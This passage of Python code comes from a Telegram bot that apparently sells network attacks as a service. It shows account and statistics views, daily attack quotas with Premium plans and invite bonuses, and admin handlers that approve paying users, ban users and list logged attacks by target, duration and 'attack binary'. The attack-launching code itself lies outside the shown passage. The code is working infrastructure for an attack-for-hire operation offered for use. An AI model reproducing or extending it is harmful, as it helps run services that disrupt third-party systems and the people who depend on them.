        bot.send_message(chat_id, "🛠 Select attack binary:", reply_markup=markup)
    except Exception as e:
        logger.error(f"Attack processing error: {e}")
        bot.send_message(chat_id, f"❌ Error: {str(e)}")

@bot.message_handler(func=lambda message: message.text == "👤 My Account")
def my_account(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    access, reason = check_user_access(user_id, chat_id)
    if not access:
        bot.send_message(chat_id, reason)
        return
    user = get_user(user_id)
    if not user:
        bot.send_message(chat_id, "❌ You don't have an account. Send /start to register.")
        return
    expiry = user.get('valid_until', 'Lifetime')
    plan = "Premium" if user.get('plan', 0) > 0 else "Free"
    total_attacks = len([log for log in attack_logs if log.get('user_id') == user_id and log.get('status') == 'completed'])
    today_attacks = get_user_attack_count(user_id)
    invite_bonus = get_user_invite_bonus(user_id)
    last_attack = next(
        (log['start_time'] for log in reversed(attack_logs)
         if log.get('user_id') == user_id and log.get('status') == 'completed'),
        None
    )
    account_msg = (
        f"👤 <b>Account Information</b>\n\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"👤 Username: @{user.get('username', 'N/A')}\n"
        f"📦 Plan: {plan}\n"
        f"📅 Expiry: {expiry}\n"
        f"📅 Joined: {format_time(user.get('join_date'))}\n\n"
        f"🚀 <b>Attack Stats</b>\n"
        f"🔢 Total: {total_attacks}\n"
        f"📊 Today: {today_attacks}/{DAILY_ATTACK_LIMIT + invite_bonus}\n"
        f"💎 Invite Bonus: {invite_bonus} extra attacks\n"
        f"⏳ Last: {format_time(last_attack)}\n\n"
        f"💡 Contact {SUPPORT_USERNAME} for upgrades"
    )
    try:
        bot.send_message(chat_id, account_msg, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Error sending plan image: {e}")
        bot.send_message(chat_id, account_msg, parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == "📊 Stats")
def show_stats(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    access, reason = check_user_access(user_id, chat_id)
    if not access:
        bot.send_message(chat_id, reason)
        return
    uptime = get_uptime()
    total_attacks = system_stats.get("total_attacks", 0)
    active_attacks_count = len(active_attacks)
    total_users = system_stats.get("total_users", 0)
    stats_msg = (
        f"📊 <b>System Statistics</b>\n\n"
        f"⏱ Uptime: {uptime}\n"
        f"🚀 Total Attacks: {total_attacks}\n"
        f"⚡ Active Attacks: {active_attacks_count}/{MAX_CONCURRENT_ATTACKS}\n"
        f"👥 Total Users: {total_users}\n"
        f"📅 Started: {format_time(system_stats.get('start_time'))}\n\n"
        f"🛠️ {DEVELOPER}"
    )
    bot.send_message(chat_id, stats_msg, parse_mode='HTML')

# ===== ADMIN COMMANDS =====
@bot.message_handler(func=lambda message: message.text == "🛠 Admin Panel" and is_user_admin(message.from_user.id))
def admin_panel(message):
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("👥 User List", callback_data="admin_users"),
        InlineKeyboardButton("📊 Attack Logs", callback_data="admin_logs"),
        InlineKeyboardButton("⛔ Ban User", callback_data="admin_ban"),
        InlineKeyboardButton("✅ Approve User", callback_data="admin_approve"),
        InlineKeyboardButton("🔄 Server Stats", callback_data="admin_stats")
    )
    bot.send_message(message.chat.id, "🛠 <b>Admin Panel</b>", reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback_handler(call):
    if call.data == "admin_users":
        users_list = "\n".join([
            f"{i+1}. ID: {u['user_id']} | Plan: {'Premium' if u.get('plan', 0) > 0 else 'Free'} | Attacks: {len([log for log in attack_logs if log.get('user_id') == u['user_id'] and log.get('status') == 'completed'])}"
            for i, u in enumerate(users[-20:])
        ])
        bot.edit_message_text(
            f"👥 <b>User List</b> (Total: {len(users)})\n\n{users_list or 'No users'}",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
    elif call.data == "admin_logs":
        recent_logs = attack_logs[-10:]
        logs_list = "\n".join([
            f"{i+1}. {log['user_id']} -> {log['target']} ({log['duration']}s) with {log.get('binary', 'unknown')} at {format_time(log.get('start_time'))}"
            for i, log in enumerate(recent_logs)
        ])
        bot.edit_message_text(
            f"📊 <b>Recent Attacks</b> (Total: {len(attack_logs)})\n\n{logs_list or 'No attacks logged'}",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
    elif call.data == "admin_ban":
        bot.send_message(call.message.chat.id, "Enter user ID to ban:")
        bot.register_next_step_handler(call.message, process_ban_user)
    elif call.data == "admin_approve":
        bot.send_message(call.message.chat.id, "Enter user ID and plan (e.g., '12345 1 30' for user 12345, plan 1, 30 days):")
        bot.register_next_step_handler(call.message, process_approve_user)
    elif call.data == "admin_stats":
        uptime = get_uptime()
        stats_msg = (
            f"🖥 <b>Server Statistics</b>\n\n"
            f"⏱ Uptime: {uptime}\n"
            f"👥 Users: {len(users)} ({len([u for u in users if u.get('plan', 0) > 0])} premium)\n"
            f"⛔ Banned: {len(banned_users)}\n"
            f"🚀 Attacks: {len(attack_logs)} ({len([log for log in attack_logs if log.get('status') == 'completed'])} completed)\n"
            f"⚡ Active: {len(active_attacks)}/{MAX_CONCURRENT_ATTACKS}\n"
            f"📅 Started: {format_time(system_stats.get('start_time'))}"
        )
        bot.edit_message_text(
            stats_msg,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

def process_ban_user(message):
    try:
        user_id = int(message.text)
        if any(u['user_id'] == user_id for u in banned_users):
            bot.send_message(message.chat.id, f"❌ User {user_id} is already banned")
            return
        banned_users.append({
            'user_id': user_id,
            'banned_by': message.from_user.id,
            'timestamp': datetime.now().isoformat(),
            'reason': 'Admin decision'
        })
        save_data(BAN_LIST_FILE, banned_users)
        bot.send_message(message.chat.id, f"✅ User {user_id} has been banned")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid user ID")

def process_approve_user(message):
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.send_message(message.chat.id, "❌ Format: user_id plan days")
            return
        user_id = int(parts[0])
        plan = int(parts[1])
        days = int(parts[2])
        user = get_user(user_id)
        if not user:
            users.append({
                'user_id': user_id,
                'plan': plan,
                'valid_until': (datetime.now() + timedelta(days=days)).date().isoformat(),
                'join_date': datetime.now().isoformat()
            })
        else:
            user['plan'] = plan
            user['valid_until'] = (datetime.now() + timedelta(days=days)).date().isoformat()
        save_data(USERS_FILE, users)
        bot.send_message(
            message.chat.id,
            f"✅ User {user_id} approved\n"
            f"📦 Plan: {plan}\n"
            f"📅 Valid for: {days} days\n"
            f"⏳ Until: {user['valid_until']}"
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")

# ===== MAIN =====
def check_network_connectivity():
    try:
        resolver.nameservers = DNS_SERVERS
        answers = resolver.resolve('api.telegram.org', 'A')
        ip = str(answers[0])
        socket.create_connection((ip, 443), timeout=10)
        return True
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout, dns.resolver.NoNameservers, socket.gaierror, socket.timeout) as e:
        logger.error(f"Network connectivity check failed: {e}")
        return False

if __name__ == '__main__':
    logger.info("Starting bot...")
    for filename in [USERS_FILE, ATTACK_LOG_FILE, BAN_LIST_FILE, SYSTEM_STATS_FILE, GROUPS_FILE, COOLDOWN_FILE, INVITES_FILE]:
        if not os.path.exists(filename):
            save_data(filename, [] if filename not in [SYSTEM_STATS_FILE, GROUPS_FILE, COOLDOWN_FILE] else {
                "total_attacks": 0,
                "total_users": 0,
                "start_time": datetime.now().isoformat()
            } if filename == SYSTEM_STATS_FILE else {
                "approved": [],
                "broadcast": []
            } if filename == GROUPS_FILE else {
                "global_cooldown": DEFAULT_COOLDOWN
            })
    check_already_running()
    while True:
        if not check_network_connectivity():
            logger.warning("No network connectivity. Retrying in 10 seconds...")
            time.sleep(10)
            continue
        try:
            logger.info("Bot is running...")
            bot.infinity_polling(timeout=20, long_polling_timeout=10)
        except requests.exceptions.ConnectionError as e:
            logger.error(f"Connection error: {e}")
            time.sleep(RETRY_BACKOFF)
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            time.sleep(RETRY_BACKOFF)
        finally:
            remove_lock()